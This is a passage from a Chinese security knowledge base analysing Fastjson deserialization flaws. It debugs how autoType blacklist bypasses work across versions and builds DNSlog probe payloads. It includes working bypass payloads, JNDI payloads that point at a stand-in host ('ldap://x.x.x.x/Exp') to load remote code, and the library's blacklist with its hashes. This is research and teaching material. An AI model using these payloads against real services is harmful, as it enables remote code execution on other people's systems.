TypeUtils.loadClass(typeName, this.defaultClassLoader); } if (clazz != null) { if (ClassLoader.class.isAssignableFrom(clazz) || DataSource.class.isAssignableFrom(clazz)) { throw new JSONException(\"autoType is not support. \" + typeName); } if (expectClass != null) { if (expectClass.isAssignableFrom(clazz)) { return clazz; } throw new JSONException(\"type not match. \" + typeName + \" -> \" + expectClass.getName()); } } if (!this.autoTypeSupport) { throw new JSONException(\"autoType is not support. \" + typeName); } else { return clazz; } } } } 这里遍历denyList数组，只要引用的库中是以我们的黑名单中的字符串开头的就直接抛出异常中断运行。 denyList数组，主要利用黑名单机制把常用的反序列化利用库都添加到黑名单中，主要有： bsh com.mchange com.sun. java.lang.Thread java.net.Socket java.rmi javax.xml org.apache.bcel org.apache.commons.beanutils org.apache.commons.collections.Transformer org.apache.commons.collections.functors org.apache.commons.collections4.comparators org.apache.commons.fileupload org.apache.myfaces.context.servlet org.apache.tomcat org.apache.wicket.util org.codehaus.groovy.runtime org.hibernate org.jboss org.mozilla.javascript org.python.core org.springframework 一些细节 parseObject(String text)在反序列化时也会调用getter方法，所以也是一个可利用的点，只不过比较鸡肋，符合条件的利用链很少 举例演示 package org.example; import com.alibaba.fastjson.JSON; public class App { public static void main(String[] args) { String json = \"{\\\"@type\\\":\\\"org.example.User\\\",\\\"age\\\":66,\\\"username\\\":\\\"test\\\"}\"; System.out.println(\"parseObject(String)\"); JSON.parseObject(json); System.out.println(\"parse(String)\"); JSON.parse(json); } } class User { private String username; private int age; public void setUsername(String username) { this.username = username; System.out.println(\"call setUsername\"); } public String getUsername() { System.out.println(\"call getUsername\"); return username; } public void setAge(int age) { this.age = age; System.out.println(\"call setAge\"); } public int getAge() { System.out.println(\"call getAge\"); return age; } } 分析 为什么会调用getter()方法呢？在getter()方法的地方下断点，查看调用栈 getAge:37, User (org.example) invoke0:-1, NativeMethodAccessorImpl (sun.reflect) invoke:62, NativeMethodAccessorImpl (sun.reflect) invoke:43, DelegatingMethodAccessorImpl (sun.reflect) invoke:498, Method (java.lang.reflect) get:451, FieldInfo (com.alibaba.fastjson.util) getPropertyValue:114, FieldSerializer (com.alibaba.fastjson.serializer) getFieldValuesMap:439, JavaBeanSerializer (com.alibaba.fastjson.serializer) toJSON:902, JSON (com.alibaba.fastjson) toJSON:824, JSON (com.alibaba.fastjson) parseObject:206, JSON (com.alibaba.fastjson) main:10, App (org.example) 分析调用栈，首先进入parseObject方法，然后正常调用parse方法（PS：此时setter方法已经被调用了，可以查看Console栏当前输出的情况） 所以调用getter方法的原因，不是出在parse函数里面，而是调用了(JSONObject)toJSON(obj)方法 继续跟toJSON方法，发现会到javaBeanSerializer.getFieldValuesMap(javaObject) 查看当前的变量，javaBeanSerializer中的getters存放了相关的getter方法后缀，javaObject中存放了相关变量的值 跟进getFieldValuesMap，发现通过Map.put存入数据，值通过getter.getPropertyValue(object)进行获取，object存放的是setter设置的变量名和值 跟进getPropertyValue，会调用this.fieldInfo.get方法 跟进get，发现反射调用User类的getAge()方法 所以getter方法被执行了 TemplatesImpl攻击调用链路 https://paper.seebug.org/1274/#templatesimpl 参考链接 Fastjson 1.2.24 反序列化漏洞深度分析 Copyright © d4m1ts 2022 all right reserved，powered by Gitbook该文章修订时间： 2021-12-25 18:52:00 "},"个人知识库/02.代码审计/01.Java安全/03.应用漏洞分析/03.Fastjson的dnslog探测方式分析.html":{"url":"个人知识库/02.代码审计/01.Java安全/03.应用漏洞分析/03.Fastjson的dnslog探测方式分析.html","title":"03.Fastjson的dnslog探测方式分析","keywords":"","body":" 前言 说明 分析 挖掘 java.net.InetSocketAddress java.net.Inet4Address java.net.Inet6Address java.net.URL java.net.URI 总结 参考文献 前言 正常测试的时候，发现java后端对json处理都会去测试一下是否存在反序列化，但是后端处理json的组件很多，比如fastjson、jackson、gson等，怎么判断是否使用了fastjson呢？ 有一个简便无危害的方式，就是通过dnslog来判断。 大佬们讨论的issue 说明 前面我们在分析的时候，会发现很多有一个变量token在进行判断，比如token == 12 或者 token == 14等，那这个token到底代表啥呢？在com.alibaba.fastjson.parser.JSONToken中我们可以找到答案 public static String name(int value) { switch(value) { case 1: return \"error\"; case 2: return \"int\"; case 3: return \"float\"; case 4: return \"string\"; case 5: return \"iso8601\"; case 6: return \"true\"; case 7: return \"false\"; case 8: return \"null\"; case 9: return \"new\"; case 10: return \"(\"; case 11: return \")\"; case 12: return \"{\"; case 13: return \"}\"; case 14: return \"[\"; case 15: return \"]\"; case 16: return \",\"; case 17: return \":\"; case 18: return \"ident\"; case 19: return \"fieldName\"; case 20: return \"EOF\"; case 21: return \"Set\"; case 22: return \"TreeSet\"; case 23: return \"undefined\"; case 24: return \";\"; case 25: return \".\"; case 26: return \"hex\"; default: return \"Unknown\"; } } 分析 fastjson 1.2.68 jdk 8u261 分析一下checkAutoType 这个黑名单检测绕过后，会来到如下几个if语句，写了个简单的注释 // 从ConcurrentHashMap类变量mapping中尝试获取这个类，mappings有点像维护的一个基础类库 clazz = TypeUtils.getClassFromMapping(typeName); // 如果mapping里面没有这个类，就会尝试从this.deserializers.buckets这个IdentityHashMap类的Map中尝试获取clazz，这个有点像开发者维护的一个可信任类 if (clazz == null) { clazz = this.deserializers.findClass(typeName); } // 如果clazz还是为null，就会尝试从this.typeMapping中去获取类，但这个类默认是空的 if (clazz == null) { clazz = (Class)this.typeMapping.get(typeName); } // 如果在白名单，就直接加载这个clazz if (internalWhite) { clazz = TypeUtils.loadClass(typeName, this.defaultClassLoader, true); } // 如果clazz不为null，且不满足后续的判定条件，就直接返回clazz if (clazz != null) { if (expectClass != null && clazz != HashMap.class && !expectClass.isAssignableFrom(clazz)) { throw new JSONException(\"type not match. \" + typeName + \" -> \" + expectClass.getName()); } else { return clazz; } } 也就是说，如果我们能在上面的几个Map中找到一些可利用的类，那么默认情况下（关闭autoType的情况）就可以绕过黑白名单检查，直接返回clazz进入后续操作 分析一下里面一共有哪些类 mappings ((ConcurrentHashMap) mappings).keySet() this.buckets Object[] a = new Object[9000]; for(int i = 0; i this.typeMapping 默认为空 汇总一下所有类： java.lang.IndexOutOfBoundsException java.lang.Integer java.lang.NoSuchFieldException java.lang.Long java.math.BigInteger java.lang.LinkageError java.lang.StringIndexOutOfBoundsException java.lang.StackOverflowError long java.lang.VerifyError java.util.LinkedHashMap java.util.Calendar java.lang.StackTraceElement [long java.lang.NoSuchMethodError java.util.concurrent.atomic.AtomicLong java.util.TreeMap java.util.Date java.lang.NoSuchFieldError java.util.concurrent.atomic.AtomicInteger java.lang.Short java.util.Locale java.lang.InstantiationException java.lang.SecurityException java.sql.Timestamp java.util.concurrent.ConcurrentHashMap java.util.UUID java.lang.IllegalAccessError com.alibaba.fastjson.JSONObject [short java.util.HashSet [byte java.lang.Boolean java.sql.Date short java.lang.Object java.util.BitSet [char java.lang.Float java.math.BigDecimal java.lang.Character java.lang.InternalError [double byte double java.lang.Exception java.lang.Double [B java.lang.TypeNotPresentException [C [D java.text.SimpleDateFormat [F [I java.util.TreeSet [J java.util.ArrayList java.lang.IllegalMonitorStateException com.alibaba.fastjson.JSONArray [S java.lang.String java.lang.Number java.util.LinkedHashSet [Z java.lang.NegativeArraySizeException java.lang.NumberFormatException java.lang.RuntimeException char java.lang.OutOfMemoryError java.lang.IllegalStateException java.sql.Time java.lang.NoSuchMethodException java.util.Collections$EmptyMap [boolean float java.lang.AutoCloseable java.lang.NullPointerException java.lang.Byte [int com.alibaba.fastjson.JSONPObject java.lang.Cloneable java.lang.IllegalAccessException java.util.IdentityHashMap java.util.HashMap java.lang.NoClassDefFoundError java.util.Hashtable java.util.WeakHashMap java.lang.IllegalThreadStateException java.lang.IllegalArgumentException int java.util.concurrent.TimeUnit boolean java.lang.InstantiationError java.lang.InterruptedException [float java.util.regex.Pattern com.alibaba.fastjson.JSONArray java.lang.StringBuilder java.nio.charset.Charset java.math.BigDecimal char java.io.File java.lang.String boolean java.net.InetSocketAddress java.lang.Character java.lang.Number java.util.concurrent.ConcurrentHashMap javax.xml.datatype.XMLGregorianCalendar java.net.Inet4Address java.sql.Date java.util.Collection com.alibaba.fastjson.JSONPath java.util.concurrent.atomic.AtomicIntegerArray java.util.TreeMap short java.util.Currency java.sql.Time java.lang.Integer double java.lang.Class java.math.BigInteger com.alibaba.fastjson.JSONObject java.util.concurrent.atomic.AtomicBoolean java.util.concurrent.atomic.AtomicLongArray java.util.HashMap java.util.TimeZone java.lang.Comparable java.util.ArrayList java.text.SimpleDateFormat com.alibaba.fastjson.JSONPObject java.lang.StringBuffer byte java.io.Closeable java.lang.Double java.util.concurrent.atomic.AtomicInteger int java.lang.Float java.net.URL java.util.List java.lang.Object java.sql.Timestamp java.lang.StackTraceElement java.net.Inet6Address java.util.concurrent.atomic.AtomicLong java.net.URI java.util.UUID java.lang.Cloneable java.util.LinkedHashMap long java.lang.Short java.lang.Byte [C java.lang.ref.WeakReference java.lang.ref.SoftReference java.util.concurrent.ConcurrentMap java.util.Calendar java.util.Date java.util.Locale java.lang.Long java.util.Map java.io.Serializable java.util.concurrent.atomic.AtomicReference java.lang.Boolean float 挖掘 既然已经拿到这些类了，我们大概筛选一下哪些是可以用的（这里筛选的是java.net.xxx的，因为带net的几乎都和网络相关可以发起请求） java.net.InetSocketAddress java.net.Inet4Address java.net.URL java.net.Inet6Address java.net.URI 那我们从第一个开始 java.net.InetSocketAddress 初始payload {\"@type\":\"java.net.InetSocketAddress\", \"a\":\"b\"} 通过checkAutoType后，成功按照我们的预期返回 然后跟到371行，执行反序列化操纵，跳过这一步会直接抛出错误异常，所以我们跟进 跟进后，判断类，通过 开始判断token，这个时候我们的token是16，即,，不等于8，进入else 来到了parser.accept(token)后，不知道这个函数干啥的，跟进一下，发现原来是判断当前的token是不是传入的token，很明显这里我们是16不是12，所以会抛出异常。 那我们修改一下payload，给他提供一个 {，也就是token=12 {\"@type\":\"java.net.InetSocketAddress\"{, \"a\":\"b\"} 这个时候我们就能成功通过accept这个函数了，继续向下 发现有个变量className，下方要求他等于address，且期望它下一位的token是17（:） 那我们看看className是怎么得来的，跟进stringVal 发现这就是一个字符串切割函数，this为我们输入的字符串，因为this.hasSpecial为false this.np就是当前这个字符串现在的游标位置，而this.sp则是切割的长度，我们再看下这个this.sp是怎么变得 前期阶段，是统计2个\"中间的长度的，方便后面切割 后面估计也差不多，发现在进入反序列化过后，paper.accept的时候，会调用nextToken，其中会用到this.sp 跟一下发现，这个字符就是我们payload中{后面的,，期望一个\"，但是我们传入的是,，所以this.sp就等于0了 所以还需要增加一对\"，来增加this.sp的值，达到切割字符串的目的 {\"@type\":\"java.net.InetSocketAddress\"{\"aaa\", \"a\":\"b\"} 更换payload后，成功通过上方的判断，进入this.scanString()，这里面this.sp++会判断我们输入的字符串长度 此时this.sp问题解决了，我们继续回到lexer.stringVal()，跟进，可以看到现在切割出来的字符串，就是我们传入的aaa 继续往后，发现className要等于address，所以给我们的aaa改成address即可，此外期望token是17，那还需要加一个: 所以修改后的payload {\"@type\":\"java.net.InetSocketAddress\"{\"address\":\"aaa\", \"a\":\"b\"} 一路顺利，到了parser.parseObject这里会进行类型转换为InetAddress 又是一路顺利，到了deserializer.deserialze,只不过这次传入的Type是InetAddress 又回到了熟悉的地方 然后一顿调，抛出异常了 回看了一下，原来是这个地方要求是16（:），而我们是4（String）。。。 那哪个地方的String出问题了呢？ 分析一下当前游标的位置，发现就是\"address\":后面应该是个,，而不是String 所以再改payload {\"@type\":\"java.net.InetSocketAddress\"{\"address\":, \"a\":\"b\"} 又回到刚才的地方，这次过了，但是要求lexer.stringVal()为val 熟悉的函数，刚才我们分析过了，就是需要一个\"xxx\"，从上面也可以看出来\"a\"是我们后面的键值对中的键 那我们给a改成val {\"@type\":\"java.net.InetSocketAddress\"{\"address\":, \"val\":\"b\"} 然后回到刚才的条件，继续向后，都是满足的，我们payload中val的值赋给了objVal 类型转换，赋值给strVal 返回InetAddress.getByName(strVal) 而InetAddress.getByName会尝试通过域名获取IP 所以给strVal的值设置为dnslog的URL即可 最终Payload {\"@type\":\"java.net.InetSocketAddress\"{\"address\":, \"val\":\"enst5r.dnslog.cn\"} 成功 最后小小的总结一下：就是整个过程中，缺什么给他补什么 java.net.Inet4Address 初始payload {\"@type\":\"java.net.Inet4Address\", \"a\":\"b\"} 运行，经过checkAutoType后反序列化，和上面一样的错，需要val，而此时的值是a 我们给a换成val就行了 {\"@type\":\"java.net.Inet4Address\", \"val\":\"b\"} 最后解析的时候，一样的方法，InetAddress.getByName(strVal) 最终POC {\"@type\":\"java.net.Inet4Address\", \"val\":\"dnslog\"} java.net.Inet6Address 看了下，和 java.net.Inet4Address 一样，就不再写了 {\"@type\":\"java.net.Inet6Address\", \"val\":\"dnslog\"} java.net.URL 这个就不能直接来硬的了，根据我们之前分析过的ysoserial#URLDNS这条链，如果将一个URL对象放置到HashMap中，那么在进行计算hashcode的时候，会触发dnslog请求 所以我们让fastjson给对象反序列化为URL对象的后，再把它放到HashMap中即可 {{\"@type\":\"java.net.URL\", \"val\":\"http://8fhj7r.dnslog.cn\"}:\"a\"} 下断点分析，fastjson给前面还原成了URL对象，当做了key 然后继续跟，发现使用put将其添加到HashMap中，所以dnslog收到了请求 java.net.URI 不能和URL类类似似使用HashMap计算key的hashCode方法去发起请求 内部也没有类似的发起请求的方法 所以目前没找到利用方法emmmmm 总结 还有一些畸形的payload，可以去前言里面看看issue，原理都差不多 只是大佬们对fastjson的解析流程真的理解太透彻了，羡慕了 参考文献 通过dnslog探测fastjson的几种方法 Copyright © d4m1ts 2022 all right reserved，powered by Gitbook该文章修订时间： 2021-12-25 18:52:00 "},"个人知识库/02.代码审计/01.Java安全/03.应用漏洞分析/04.Fastjson各版本漏洞分析.html":{"url":"个人知识库/02.代码审计/01.Java安全/03.应用漏洞分析/04.Fastjson各版本漏洞分析.html","title":"04.Fastjson各版本漏洞分析","keywords":"","body":" 前言 概念 演示代码 fastjson 1.2.24 fastjson 1.2.41 fastjson 1.2.42 fastjson 1.2.43 fastjson 1.2.45 fastjson 1.2.47 fastjson 1.2.62 fastjson 1.2.66 fastjson 1.2.68 fastjson黑名单 Payload转换 Fastjson姿势技巧集合 参考链接 前言 最先出现问题的Fastjson 1.2.24反序列化漏洞已经分析过了，产生漏洞的原理也差不多理解了 在1.2.25之后的版本，以及所有的.sec01后缀版本中，autotype功能默认是受限的（黑白名单机制） 在1.2.68之后的版本，fastjson增加了safeMode的支持。配置safeMode后，无论白名单和黑名单，都不支持autoType 概念 可能出现一些新的概念，给一些参考链接吧 FastJSON为什么要有autoType功能 enable_autotype fastjson_safemode 演示代码 后面的分析代码都以此为基础修改 package org.example; import com.alibaba.fastjson.JSON; public class App { public static void main(String[] args) { String json = \"{\\\"@type\\\":\\\"org.example.User\\\",\\\"age\\\":66,\\\"username\\\":\\\"test\\\"}\"; System.out.println(JSON.parseObject(json)); } } class User { private String username; private int age; public void setUsername(String username) { this.username = username; System.out.println(\"call setUsername\"); } public String getUsername() { System.out.println(\"call getUsername\"); return username; } public void setAge(int age) { this.age = age; System.out.println(\"call setAge\"); } public int getAge() { return age; } } fastjson 1.2.24 之前已经分析过了，就不在写了 fastjson 1.2.41 利用的前提是必须要手动开启autoTypeSupport，不然还是不能利用，所以说还是有一点鸡肋吧 从代码中开启autoTypeSupport ParserConfig.getGlobalInstance().setAutoTypeSupport(true); 在1.2.25之后的版本，以及所有的.sec01后缀版本中，增加了checkAutotype函数，autotype功能默认是受限的（黑白名单机制） 但在1.2.25到1.2.41之间，发生过一次checkAutotype的绕过。 Payload如下 {\"@type\":\"Lorg.example.User;\",\"age\":66,\"username\":\"test\"} 我们用这个payload来分析一下如何绕过的（fastjson 1.2.41） 进入checkAutoType后，首先会对typeName的长度进行判断，很明显这个条件满足不了，所以不会抛出异常 继续向下，开启autoTypeSupport时，会先通过黑白名单来判断，先白名单后黑名单 很明显我们传入的typeName Lorg.example.User;肯定是不在黑名单内的，这是一个绕过的点 继续向下，如果clazz==null，就会调用TypeUtils.getClassFromMapping(typeName);，跟一下其实就是从一个ConcurrentHashMap中看看存不存在这个类，很明显我们传入的L开头的类是不会存在的 继续向下，和上面类似，我们这个类还是找不到的，所以clazz还是null 没开启autoTypeSupport的情况下，依然会进行黑白名单检测，先黑名单后白名单，我们这里手动开启了所以这里不管，因为会跳过 前面黑名单检测都没问题，就会开始加载这个类了 跟进loadClass，如果第一个字符是[，就会去掉[再去解析，我们这里不满足就先不看，继续向下 这个条件就是这次绕过的核心条件了 else if (className.startsWith(\"L\") && className.endsWith(\";\")) { String newClassName = className.substring(1, className.length() - 1); return loadClass(newClassName, classLoader); } 如果开头是L而且结尾是;，那么就会给前后这俩字符去掉，所以可以看到我们的newClassName就是我们想要的org.example.User 后续就会加载我们的类实例化，达到我们绕过的目的 debug过程中，可能大家注意到一个点，loadClass函数中，有一个条件，如果第一个字符是[，就会去掉[再去实例化，那这个地方是不是也能用来绕过呢？ 答案是当然可以，这个绕过点就体现在1.2.43版本中 fastjson 1.2.42 1.2.41问题出现后，1.2.42中尝试了修复，修复方式 https://github.com/alibaba/fastjson/commit/e701faa2da7cff6d94394061bbff06a166c2aaaf 寻找历史commit技巧： release里面找对应的版本的commit 直接搜索commit 直接搜索issue 可以明显的看到，给原来的denyList变成了denyHashCodes，让安全研究更难了，但是hashcode的方法是公开的，只要jar包够多还是可以碰撞出来的，感觉治标不治本。。。 同时可以看到针对漏洞绕过的修复方式，很简单粗暴，如果发现开头是L而且结尾是;，就直接去掉 所以绕过方式也很简单，直接用2个L和2个;就可以了，Payload如下 {\"@type\":\"LLorg.example.User;;\",\"age\":66,\"username\":\"test\"} fastjson 1.2.43 对LL;;可以绕过的情况做了过滤，如果只有一个L;，就去除了后再走黑名单去过滤看看是否允许反序列化，着实太恶心了看着 所以2个LL;;是行不通了，但是别忘了我们在分析1.2.41的时候，发现还会去掉[然后实例化，这就是绕过点 初始payload {\"@type\":\"[org.example.User\",\"age\":66,\"username\":\"test\"} 报错exepct '[', but ,, pos 29, json : {\"@type\":\"[org.example.User\",\"age\":66,\"username\":\"test\"}，29那个位置，期望一个[，但是是,，所以我们加一个[ {\"@type\":\"[org.example.User\"[,\"age\":66,\"username\":\"test\"} 报错syntax error, expect {, actual string, pos 30, fastjson-version 1.2.43，期望30的位置是一个{，加上 最终POC {\"@type\":\"[org.example.User\"[{,\"age\":66,\"username\":\"test\"} 看着有点迷，为啥加上[{就可以了？ 分析一下，通过checkAutoType后，返回class [Lorg.example.User; 一直跟，发现调用了deserializer.deserialze，跟进去，发现使用了clazz.getComponentType()，是不是很眼熟？就是前面去掉[的那个地方 这个函数是native的，所以看不到代码。。。不过根据结果来看，就是去掉[L和;拿到类 再继续往下，跟进parseArray 发现如果token != 14就会抛出错误，而没有[的时候，token是16，所以会报错，{也类似，可以下个异常断点来分析 最后看下到setXXX的运行堆栈信息，结合堆栈来分析可以节约很多时间 setUsername:20, User (org.example) invoke0:-1, NativeMethodAccessorImpl (sun.reflect) invoke:62, NativeMethodAccessorImpl (sun.reflect) invoke:43, DelegatingMethodAccessorImpl (sun.reflect) invoke:498, Method (java.lang.reflect) setValue:110, FieldDeserializer (com.alibaba.fastjson.parser.deserializer) parseField:118, DefaultFieldDeserializer (com.alibaba.fastjson.parser.deserializer) parseField:1061, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer) deserialze:756, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer) deserialze:271, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer) deserialze:267, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer) parseArray:729, DefaultJSONParser (com.alibaba.fastjson.parser) deserialze:183, ObjectArrayCodec (com.alibaba.fastjson.serializer) parseObject:373, DefaultJSONParser (com.alibaba.fastjson.parser) parse:1338, DefaultJSONParser (com.alibaba.fastjson.parser) parse:1304, DefaultJSONParser (com.alibaba.fastjson.parser) parse:152, JSON (com.alibaba.fastjson) parse:162, JSON (com.alibaba.fastjson) parse:131, JSON (com.alibaba.fastjson) parseObject:223, JSON (com.alibaba.fastjson) main:10, App (org.example) fastjson 1.2.45 1.2.44中对[进行了判断，我们用1.2.43的POC，然后下个JSONException的异常断点，看看是怎么判断的 运行后，在com.alibaba.fastjson.parser.ParserConfig#checkAutoType(java.lang.String, java.lang.Class, int)成功拦截 分析一下，发现如果开头是[就直接抛出异常 那再看看1.2.41里面的绕法呢，前面加个L，后面加个;，发现会检查结尾是否为;，是的话也抛出异常 当然这个版本既然有RCE，肯定不是之前的方法绕过的，这次是通过不在黑名单里面的类来绕过的 {\"@type\":\"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory\",\"properties\":{\"data_source\":\"ldap://x.x.x.x/Exp\"}} fastjson 1.2.47 这个版本绕过了autoTypeSupport检测，不开启ast依然可以利用（1.2.25 - 1.2.45 这些绕过都是需要开启ast的） Payload： { \"a\": { \"@type\": \"java.lang.Class\", \"val\": \"org.example.User\" }, \"b\": { \"@type\": \"org.example.User\", \"username\": \"123456\", \"age\": 123 } } 绕过原理： 利用到了java.lang.class，这个类不在黑名单，所以checkAutotype可以过 这个java.lang.class类对应的deserializer为MiscCodec，deserialize时会取json串中的val值并load这个val对应的class，如果fastjson cache为true，就会缓存这个val对应的class到全局map中 如果再次加载val名称的class，并且autotype没开启（因为开启了会先检测黑白名单，所以这个漏洞开启了反而不成功），下一步就是会尝试从全局map中获取这个class，如果获取到了，直接返回 debug分析： 在setXXX的地方下断点，运行看下调用堆栈信息 setUsername:28, User (org.example) invoke0:-1, NativeMethodAccessorImpl (sun.reflect) invoke:62, NativeMethodAccessorImpl (sun.reflect) invoke:43, DelegatingMethodAccessorImpl (sun.reflect) invoke:498, Method (java.lang.reflect) setValue:110, FieldDeserializer (com.alibaba.fastjson.parser.deserializer) parseField:124, DefaultFieldDeserializer (com.alibaba.fastjson.parser.deserializer) parseField:1078, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer) deserialze:773, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer) deserialze:271, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer) deserialze:267, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer) parseObject:384, DefaultJSONParser (com.alibaba.fastjson.parser) parseObject:544, DefaultJSONParser (com.alibaba.fastjson.parser) parse:1356, DefaultJSONParser (com.alibaba.fastjson.parser) parse:1322, DefaultJSONParser (com.alibaba.fastjson.parser) parse:152, JSON (com.alibaba.fastjson) parse:162, JSON (com.alibaba.fastjson) parse:131, JSON (com.alibaba.fastjson) parseObject:223, JSON (com.alibaba.fastjson) main:20, App (org.example) 进入到parse:1356, DefaultJSONParser (com.alibaba.fastjson.parser)开始下断点重新运行分析 跟进，一直F8，识别到传入的参数a，继续向下，识别到后面还是{开头后，递归调用parseObject 继续往后识别到@type 然后就是进入checkAutoType检查，因为java.lang.Class在this.deserializers.buckets里面，所以直接返回了class java.lang.Class 通过了checkAutoType检查后，常规调用deserializer.deserialze进行反序列化，但这里是com.alibaba.fastjson.serializer.MiscCodec#deserialze 这里会取出我们的变量val的值，也是我们传入的恶意类 然后就是一系列的Class的判断，一直到Class.class，然后会进入loadClass 跟进loadClass，一直跟，发现在cache为true的时候，会直接给咱们的恶意类加入到mappings中，而这个mappings是不是看着很眼熟？后面分析 这个cache默认就是为true 然后开始处理字段b，和上面类似，我们一直到checkAutoType 可以看到此处如果开启了autoTypeSupport检查会进入黑名单检查，反而影响我们的payload 跟进下方的getClassFromMapping，可以看到就是上面我们添加恶意类的那个Mapping，从此绕过了checkAutoType检查 到此差不多就结束了，大佬就是大佬，太牛了 fastjson 1.2.62 1.2.47后肯定修复了，怎么修的呢？我们用1.2.62去试试1.2.47的POC 抛出了一场，然后下个异常断点，分析一下，看样子是前面某个地方设置了autoTypeSupport的值 咱们追踪一下这个变量，下个字段断点 发现来源是这 跟一下AUTO_SUPPORT，原来是从配置文件里面读是否开启了autoTypeSupport。。。大意了 那我们开启ast后再试试 结果就是java.lang.Class被加入到了黑名单 据说修复还将cache默认设置为false了，去TypeUtils类看看，发现确实如此 1.2.62的RCE也很简单，由于CVE-2020-8840的gadget绕过了fastjson的黑名单而导致的，当服务端存在收到漏洞影响的xbean-reflect依赖并且开启fastjson的autotype时，远程攻击者可以通过精心构造的请求包触发漏洞从而导致在服务端上造成远程命令执行的效果。 {\"@type\":\"org.apache.xbean.propertyeditor.JndiConverter\",\"AsText\":\"ldap://x.x.x.x/Exp\"} fastjson 1.2.66 和1.2.62类似，在开启AutoType的情况下，由于黑名单过滤不全而导致的绕过问题 {\"@type\":\"org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup\",\"jndiNames\":\"ldap://x.x.x.x/Exp\"} fastjson 1.2.68 这个文档太大了太卡了，后面单独分析 fastjson黑名单 参考https://github.com/LeadroyaL/fastjson-blacklist fastjson 在1.2.42开始，把原本明文的黑名单改成了哈希过的黑名单，防止安全研究者对其进行研究。在 https://github.com/alibaba/fastjson/commit/eebea031d4d6f0a079c3d26845d96ad50c3aaccd 这次commit中体现出来。 fastjson 在1.2.61开始，在https://github.com/alibaba/fastjson/commit/d1c0dff9a33d49e6e7b98a4063da01bbc9325a38中，把黑名单从十进制数变成了十六进制数，可能是为了防止安全研究者进行搜索 对照表 version hash hex-hash name 1.2.42 -8720046426850100497 0x86fc2bf9beaf7aefL org.apache.commons.collections4.comparators 1.2.42 -8109300701639721088 0x8f75f9fa0df03f80L org.python.core 1.2.42 -7966123100503199569 0x9172a53f157930afL org.apache.tomcat 1.2.42 -7766605818834748097 0x9437792831df7d3fL org.apache.xalan 1.2.42 -6835437086156813536 0xa123a62f93178b20L javax.xml 1.2.42 -4837536971810737970 0xbcdd9dc12766f0ceL org.springframework. 1.2.42 -4082057040235125754 0xc7599ebfe3e72406L org.apache.commons.beanutils 1.2.42 -2364987994247679115 0xdf2ddff310cdb375L org.apache.commons.collections.Transformer 1.2.42 -1872417015366588117 0xe603d6a51fad692bL org.codehaus.groovy.runtime 1.2.42 -254670111376247151 0xfc773ae20c827691L java.lang.Thread 1.2.42 -190281065685395680 0xfd5bfc610056d720L javax.net. 1.2.42 313864100207897507 0x45b11bc78a3aba3L com.mchange 1.2.42 1203232727967308606 0x10b2bdca849d9b3eL org.apache.wicket.util 1.2.42 1502845958873959152 0x14db2e6fead04af0L java.util.jar. 1.2.42 3547627781654598988 0x313bb4abd8d4554cL org.mozilla.javascript 1.2.42 3730752432285826863 0x33c64b921f523f2fL java.rmi 1.2.42 3794316665763266033 0x34a81ee78429fdf1L java.util.prefs. 1.2.42 4147696707147271408 0x398f942e01920cf0L com.sun. 1.2.42 5347909877633654828 0x4a3797b30328202cL java.util.logging. 1.2.42 5450448828334921485 0x4ba3e254e758d70dL org.apache.bcel 1.2.42 5751393439502795295 0x4fd10ddc6d13821fL java.net.Socket 1.2.42 5944107969236155580 0x527db6b46ce3bcbcL org.apache.commons.fileupload 1.2.42 6742705432718011780 0x5d92e6ddde40ed84L org.jboss 1.2.42 7179336928365889465 0x63a220e60a17c7b9L org.hibernate 1.2.42 7442624256860549330 0x6749835432e0f0d2L org.apache.commons.collections.functors 1.2.42 8838294710098435315 0x7aa7ee3627a19cf3L org.apache.myfaces.context.servlet 1.2.43 -2262244760619952081 0xe09ae4604842582fL java.net.URL 1.2.46 -8165637398350707645 0x8eadd40cb2a94443L junit. 1.2.46 -8083514888460375884 0x8fd1960988bce8b4L org.apache.ibatis.datasource 1.2.46 -7921218830998286408 0x92122d710e364fb8L org.osjava.sj. 1.2.46 -7768608037458185275 0x94305c26580f73c5L org.apache.log4j. 1.2.46 -6179589609550493385 0xaa3daffdb10c4937L org.logicalcobwebs. 1.2.46 -5194641081268104286 0xb7e8ed757f5d13a2L org.apache.logging. 1.2.46 -3935185854875733362 0xc963695082fd728eL org.apache.commons.dbcp 1.2.46 -2753427844400776271 0xd9c9dbf6bbd27bb1L com.ibatis.sqlmap.engine.datasource 1.2.46 -1589194880214235129 0xe9f20bad25f60807L org.jdom. 1.2.46 1073634739308289776 0xee6511b66fd5ef0L org.slf4j. 1.2.46 5688200883751798389 0x4ef08c90ff16c675L javassist. 1.2.46 7017492163108594270 0x616323f12c2ce25eL oracle.net 1.2.46 8389032537095247355 0x746bd4a53ec195fbL org.jaxen. 1.2.48 1459860845934817624 0x144277b467723158L java.net.InetAddress 1.2.48 8409640769019589119 0x74b50bb9260e31ffL java.lang.Class 1.2.49 4904007817188630457 0x440e89208f445fb9L com.alibaba.fastjson.annotation 1.2.59 5100336081510080343 0x46c808a4b5841f57L org.apache.cxf.jaxrs.provider. 1.2.59 6456855723474196908 0x599b5c1213a099acL ch.qos.logback. 1.2.59 8537233257283452655 0x767a586a5107feefL net.sf.ehcache.transaction.manager. 1.2.60 3688179072722109200 0x332f0b5369a18310L com.zaxxer.hikari. 1.2.61 -4401390804044377335 0xc2eb1e621f439309L flex.messaging.util.concurrent.AsynchBeansWorkManagerExecutor 1.2.61 -1650485814983027158 0xe9184be55b1d962aL org.apache.openjpa.ee. 1.2.61 -1251419154176620831 0xeea210e8da2ec6e1L oracle.jdbc.rowset.OracleJDBCRowSet 1.2.61 -9822483067882491 0xffdd1a80f1ed3405L com.mysql.cj.jdbc.admin. 1.2.61 99147092142056280 0x1603dc147a3e358L oracle.jdbc.connector.OracleManagedConnectionFactory 1.2.61 3114862868117605599 0x2b3a37467a344cdfL org.apache.ibatis.parsing. 1.2.61 4814658433570175913 0x42d11a560fc9fba9L org.apache.axis2.jaxws.spi.handler. 1.2.61 6511035576063254270 0x5a5bd85c072e5efeL jodd.db.connection. 1.2.61 8925522461579647174 0x7bddd363ad3998c6L org.apache.commons.configuration.JNDIConfiguration 1.2.62 -9164606388214699518 